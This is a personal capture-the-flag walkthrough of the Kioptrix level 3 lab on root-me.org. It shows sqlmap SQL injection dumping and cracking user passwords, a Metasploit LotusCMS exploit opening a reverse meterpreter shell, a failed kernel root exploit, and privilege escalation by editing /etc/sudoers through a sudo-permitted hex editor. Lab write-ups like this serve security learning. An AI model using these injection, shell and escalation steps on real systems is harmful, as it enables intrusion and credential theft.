@@ -1,0 +1,303 @@
+Kioptrix level 3
+time taken: ~ 3 hours
+
+nmap shows ssh and an apache server is running
+
+in /gallery/, view source:
+
+<a href="gadmin">Admin</a>&nbsp;&nbsp;>
+
+hidden endpoint?
+
+http://ctf02.root-me.org/gallery/gadmin/ leads to the gallarific admin login endpoint
+
+SQLMAP:
+
+sqlmap -u "http://ctf02.root-me.org/gallery/gallery.php?id=1" --dbs --dump
+
+Database: gallery
+Table: gallarific_users
+[1 entry]
++--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+| userid | photo   | email   | website | username | lastname | joincode | usertype  | password | firstname | datejoined | issuperuser |
++--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+| 1      | <blank> | <blank> | <blank> | admin    | User     | <blank>  | superuser | n0t7t1k4 | Super     | 1302628616 | 1           |
++--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+
+[02:37:05] [INFO] table 'gallery.gallarific_users' dumped to CSV file '/root/.sqlmap/output/ctf02.root-me.org/dump/gallery/gallarific_users.csv'
+[02:37:05] [INFO] fetching columns for table 'dev_accounts' in database 'gallery'
+[02:37:05] [INFO] the SQL query used returns 3 entries
+[02:37:06] [INFO] retrieved: id
+[02:37:06] [INFO] retrieved: int(10)
+[02:37:06] [INFO] retrieved: username
+[02:37:06] [INFO] retrieved: varchar(50)
+[02:37:07] [INFO] retrieved: password
+[02:37:07] [INFO] retrieved: varchar(50)
+[02:37:07] [INFO] fetching entries for table 'dev_accounts' in database 'gallery'
+[02:37:07] [INFO] the SQL query used returns 2 entries
+[02:37:07] [INFO] retrieved: 1
+[02:37:08] [INFO] retrieved: 0d3eccfb887aabd50f243b3f155c0f85
+[02:37:08] [INFO] retrieved: dreg
+[02:37:08] [INFO] retrieved: 2
+[02:37:08] [INFO] retrieved: 5badcaf789d3d1d09794d8f021f40f0e
+[02:37:09] [INFO] retrieved: loneferret
+[02:37:09] [INFO] analyzing table dump for possible password hashes
+[02:37:09] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[02:37:12] [INFO] writing hashes to a temporary file '/tmp/sqlmapQ9J5RC2284/sqlmaphashes-qUlyY9.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[02:37:14] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[02:37:17] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[02:37:19] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[02:37:19] [INFO] starting 2 processes 
+[02:37:21] [INFO] cracked password 'Mast3r' for user 'dreg'                    
+[02:37:25] [INFO] cracked password 'starwars' for user 'loneferret'            
+[02:37:26] [INFO] postprocessing table dump                                    
+Database: gallery
+Table: dev_accounts
+[2 entries]
++----+------------+---------------------------------------------+
+| id | username   | password                                    |
++----+------------+---------------------------------------------+
+| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
+| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
++----+------------+---------------------------------------------+
+
+Database: gallery
+Table: gallarific_users
+[1 entry]
++--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+| userid | photo   | email   | website | username | lastname | joincode | usertype  | password | firstname | datejoined | issuperuser |
++--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+| 1      | <blank> | <blank> | <blank> | admin    | User     | <blank>  | superuser | n0t7t1k4 | Super     | 1302628616 | 1           |
++--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+
+Database: gallery
+Table: gallarific_settings
+[24 entries]
++-------------+--------------------------------------+----------------+
+| settings_id | settings_name                        | settings_value |
++-------------+--------------------------------------+----------------+
+| 1           | gallarific_version                   | 2.0            |
+| 2           | gallarific_theme                     | black          |
+| 3           | gallarific_gallery_name              | Gallarific     |
+| 4           | gallarific_date_format               | m/d/Y          |
+| 5           | gallarific_comment_date_format       | m/d/Y          |
+| 6           | gallarific_recent_date_format        | m/d/Y          |
+| 7           | gallarific_photos_per_page           | 20             |
+| 8           | gallarific_comments_per_page         | 10             |
+| 9           | gallarific_users_per_page            | 20             |
+| 10          | gallarific_recent_photos             | 4              |
+| 11          | gallarific_popular_photos            | 8              |
+| 12          | gallarific_accept_user_registrations | 1              |
+| 13          | gallarific_html_type                 | text/html      |
+| 14          | gallarific_charset                   | UTF-8          |
+| 15          | gallarific_comments_enabled          | 1              |
+| 16          | gallarific_auto_approve_comments     | 0              |
+| 17          | gallarific_userimage_width           | 32             |
+| 18          | gallarific_userimage_height          | 32             |
+| 19          | gallarific_medium_width              | 430            |
+| 20          | gallarific_medium_height             | 430            |
+| 21          | gallarific_thumbnail_width           | 150            |
+| 22          | gallarific_thumbnail_height          | 150            |
+| 23          | gallarific_e_mail                    | bla@bla.com    |
+| 24          | gallarific_installer_done            | 1              |
++-------------+--------------------------------------+----------------+
+
+[02:37:47] [INFO] table 'gallery.gallarific_settings' dumped to CSV file '/root/.sqlmap/output/ctf02.root-me.org/dump/gallery/gallarific_settings.csv'
+[02:37:47] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2 times
+[02:37:47] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf02.root-me.org'
+
+[*] shutting down at 02:37:47
+
+so gallarific login: admin:n0t7t1k4
+ssh login: dreg:Mast3r
+loneferret:starwars
+
+METASPLOIT:
+
+use lotus cms exploit in metasploit against login endpoint in /index.php
+
+msf exploit(lcms_php_exec) > show options
+
+Module options (exploit/multi/http/lcms_php_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST    212.129.28.21    yes       The target address
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /                yes       URI
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  (public ip)   yes       The listen address
+   LPORT  4447             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+[*] Started reverse TCP handler on 10.0.2.15:4447 
+[*] Using found page param: /index.php?page=index
+[*] Sending exploit ...
+[*] Sending stage (33986 bytes) to 10.0.2.2
+[*] Meterpreter session 1 opened (10.0.2.15:4447 -> 10.0.2.2:36243) at 2017-05-28 01:59:49 -0600
+
+meterpreter > ls
+Listing: /home/www/kioptrix3.com
+================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+40777/rwxrwxrwx   4096   dir   2017-05-28 01:30:44 -0600  cache
+40777/rwxrwxrwx   4096   dir   2017-05-28 01:30:45 -0600  core
+40777/rwxrwxrwx   4096   dir   2017-05-28 01:30:44 -0600  data
+100644/rw-r--r--  23126  fil   2017-05-28 01:30:44 -0600  favicon.ico
+40755/rwxr-xr-x   4096   dir   2017-05-28 01:30:44 -0600  gallery
+100644/rw-r--r--  26430  fil   2017-05-28 01:30:44 -0600  gnu-lgpl.txt
+100644/rw-r--r--  399    fil   2017-05-28 01:30:44 -0600  index.php
+40777/rwxrwxrwx   4096   dir   2011-04-14 10:24:17 -0600  modules
+40777/rwxrwxrwx   4096   dir   2017-05-28 01:30:44 -0600  style
+100644/rw-r--r--  243    fil   2017-05-28 01:30:44 -0600  update.php
+
+meterpreter > sysinfo
+Computer    : ctf
+OS          : Linux ctf 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+Meterpreter : php/linux
+
+drop a shell and look around..
+
+users:
+
+dreg
+loneferret
+www
+
+uname -r
+2.6.24-24-server
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+root@kdog:~/ctf_shit/kioprtix_3# ssh dreg@212.129.28.21
+dreg@212.129.28.21's password: 
+dreg@ctf:~$ id
+uid=1001(dreg) gid=1001(dreg) groups=1001(dreg)
+
+nothing else in dreg, plus can't sudo -l, so let's check loneferret
+
+loneferret@ctf:/home/www/kioptrix3.com/gallery$ cat gconfig.php:
+
+	$GLOBALS["gallarific_mysql_server"] = "localhost";
+	$GLOBALS["gallarific_mysql_database"] = "gallery";
+	$GLOBALS["gallarific_mysql_username"] = "root";
+	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
+
+looks like mysql root creds... 
+
+looks like loneferret has more permissions than dreg so let's stick here
+
+let's try an external exploit...
+
+(google for 2.6.24-24-server exploits, host via pastebin, wget...)
+
+loneferret@ctf:/tmp$ ls
+exp  exp.c
+loneferret@ctf:/tmp$ ./exp
+-----------------------------------
+ Linux vmsplice Local Root Exploit
+ By qaaz
+-----------------------------------
+[+] addr: 0xc0120970
+[-] wtf
+
+ok that didn't work
+
+loneferret@ctf:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+
+AHA!!!!
+
+loneferret@ctf:~$ cat CompanyPolicy.README 
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+
+well alrighty then...
+
+so the only two things we can do with root privs as loneferret is su and ht. 
+ht looks like some sort of hex editor
+
+loneferret@ctf:~$ sudo ht /etc/sudoers
+Error opening terminal: xterm-256color.
+loneferret@ctf:~$ ht /etc/sudoers 
+Error opening terminal: xterm-256color.
+loneferret@ctf:~$ export TERM=xterm -- thanks stackoverflow!
+loneferret@ctf:~$ ht /etc/sudoers
+┌─[x]──────────────────────────── /etc/sudoers ────────────────────────────2───┐
+│00000000 23 20 2f 65 74 63 2f 73-75 64 6f 65 72 73 0a 23 |# /etc/sudoers?#|   ^
+│00000010 0a 23 20 54 68 69 73 20-66 69 6c 65 20 4d 55 53 |?# This file MUS|   ▒
+│00000020 54 20 62 65 20 65 64 69-74 65 64 20 77 69 74 68 |T be edited with|   ▒
+│00000030 20 74 68 65 20 27 76 69-73 75 64 6f 27 20 63 6f | the 'visudo' co|   ▒
+│00000040 6d 6d 61 6e 64 20 61 73-20 72 6f 6f 74 2e 0a 23 |mmand as root.?#|   ▒
+│00000050 0a 23 20 53 65 65 20 74-68 65 20 6d 61 6e 20 70 |?# See the man p|   ▒
+│00000060 61 67 65 20 66 6f 72 20-64 65 74 61 69 6c 73 20 |age for details |   ▒
+│00000070 6f 6e 20 68 6f 77 20 74-6f 20 77 72 69 74 65 20 |on how to write |   ▒
+│00000080 61 20 73 75 64 6f 65 72-73 20 66 69 6c 65 2e 0a |a sudoers file.?|   ▒
+│00000090 23 0a 0a 44 65 66 61 75-6c 74 73 09 65 6e 76 5f |#??Defaults?env_|   ▒
+│000000a0 72 65 73 65 74 0a 0a 23-20 48 6f 73 74 20 61 6c |reset??# Host al|   
+│000000b0 69 61 73 20 73 70 65 63-69 66 69 63 61 74 69 6f |ias specificatio|   
+│000000c0 6e 0a 0a 23 20 55 73 65-72 20 61 6c 69 61 73 20 |n??# User alias |   
+│000000d0 73 70 65 63 69 66 69 63-61 74 69 6f 6e 0a 0a 23 |specification??#|   
+│000000e0 20 43 6d 6e 64 20 61 6c-69 61 73 20 73 70 65 63 | Cmnd alias spec|   
+│000000f0 69 66 69 63 61 74 69 6f-6e 0a 0a 23 20 55 73 65 |ification??# Use|   
+│00000100 72 20 70 72 69 76 69 6c-65 67 65 20 73 70 65 63 |r privilege spec|   
+│00000110 69 66 69 63 61 74 69 6f-6e 0a 72 6f 6f 74 09 41 |ification?root?A|   
+│00000120 4c 4c 3d 28 41 4c 4c 29-20 41 4c 4c 0a 6c 6f 6e |LL=(ALL) ALL?lon|   
+│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|   v
+└─── view 0h/0 ────────────────────────────────────────────────────────────
+
+alright! now to figure out how to actually edit it...
+
+41 4c 4c 3d --> "ALL=",so changing
+	loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht 
+to
+	loneferret ALL=(ALL) ALL
+should make loneferret a superuser WITHOUT explicitly su'ing into root
+
+in other words, why change to a user with higher privs
+when you can bring the privs down to your level?
+
+loneferret@ctf:~$ id
+uid=1000(loneferret) gid=100(users) groups=100(users)
+
+BUT WAIT.
+
+loneferret@ctf:~$ sudo cat /passwd
+***ROOT FLAG***
+
+YEP THAT WORKED. Might as well be root@ctf now with that trick. learning is fun
